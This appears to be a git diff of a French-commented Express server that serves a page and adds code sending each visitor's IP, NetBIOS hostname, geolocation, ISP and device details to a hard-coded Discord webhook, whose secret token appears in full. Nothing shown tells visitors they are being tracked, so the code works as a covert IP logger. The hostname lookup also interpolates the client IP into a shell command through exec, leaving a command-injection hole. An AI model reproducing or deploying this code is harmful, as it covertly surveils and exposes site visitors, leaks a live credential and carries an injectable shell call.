@@ -10,17 +10,20 @@ const path = require("path");
 const app = express();
 const PORT = 40120;
 
+// Ton Webhook Discord
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1261431267820441660/IfIo4L3V5Y-fmC8_gkD2x2jnDQPjHi-AUEkMEtOnqCcSkQKt_ksXISnHFYbxvSkr-2ps";
+
 // Middleware
 app.use(requestIp.mw());
 app.use(useragent.express());
-app.use(express.static("public")); // dossier pour index.html
+app.use(express.static("public"));
 
 // Vérifier si l'IP est locale
 function isPrivateIP(ip) {
   return /^10\.|^192\.168\.|^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(ip) || ip === "127.0.0.1";
 }
 
-// Fonction pour récupérer hostname via NetBIOS
+// Récupérer hostname via NetBIOS
 function getHostnameNetBIOS(ip, callback) {
   exec(`nbtstat -A ${ip}`, (err, stdout) => {
     if (err) return callback(null);
@@ -29,7 +32,7 @@ function getHostnameNetBIOS(ip, callback) {
   });
 }
 
-// Fonction pour récupérer hostname
+// Récupérer hostname
 function getHostname(ip, callback) {
   getHostnameNetBIOS(ip, (nbtHostname) => {
     if (nbtHostname) return callback(nbtHostname);
@@ -40,7 +43,7 @@ function getHostname(ip, callback) {
   });
 }
 
-// Fonction pour localiser l'IP via ip-api.com
+// Localiser l'IP via ip-api.com
 async function localiserIP(ip) {
   try {
     const response = await fetch(`http://ip-api.com/json/${ip}`);
@@ -62,21 +65,48 @@ async function localiserIP(ip) {
   }
 }
 
-// Route principale : renvoie la page vidéo côté client
+// Envoyer les infos au webhook Discord
+async function sendToDiscord(infos) {
+  const content = `
+**Nouvelle visite**
+IP : ${infos.ip}
+Hostname : ${infos.hostname}
+Pays : ${infos.localisation.pays || "N/A"}
+Région : ${infos.localisation.region || "N/A"}
+Ville : ${infos.localisation.ville || "N/A"}
+ZIP : ${infos.localisation.zip || "N/A"}
+ISP : ${infos.localisation.isp || "N/A"}
+Navigateur : ${infos.navigateur}
+OS : ${infos.os}
+Plateforme : ${infos.plateforme}
+Mobile : ${infos.mobile}
+Tablette : ${infos.tablette}
+Desktop : ${infos.desktop}
+`;
+  try {
+    await fetch(DISCORD_WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content })
+    });
+  } catch (err) {
+    console.error("Erreur en envoyant le webhook Discord :", err);
+  }
+}
+
+// Route principale
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "sv-js", "index.html"));
 });
 
-// Middleware pour logger infos côté serveur
+// Middleware pour logger infos
 app.use((req, res, next) => {
   const ip = req.clientIp || req.ip;
   const realIp = ip.includes("::ffff:") ? ip.replace("::ffff:", "") : (ip === "::1" ? "127.0.0.1" : ip);
   const ua = req.useragent;
 
-  // Envoyer la page tout de suite
-  next();
+  next(); // on envoie la page immédiatement
 
-  // Récupération des infos en arrière-plan
   (async () => {
     const hostname = await new Promise(resolve => getHostname(realIp, resolve));
     let localisation = {};
@@ -86,8 +116,8 @@ app.use((req, res, next) => {
 
     const infos = {
       ip: realIp,
-      hostname: hostname,
-      localisation: localisation,
+      hostname,
+      localisation,
       navigateur: ua.browser,
       os: ua.os,
       plateforme: ua.platform,
@@ -97,6 +127,9 @@ app.use((req, res, next) => {
     };
 
     console.log("Nouvelle visite :", infos);
+
+    // Envoyer sur Discord
+    await sendToDiscord(infos);
   })();
 });
 
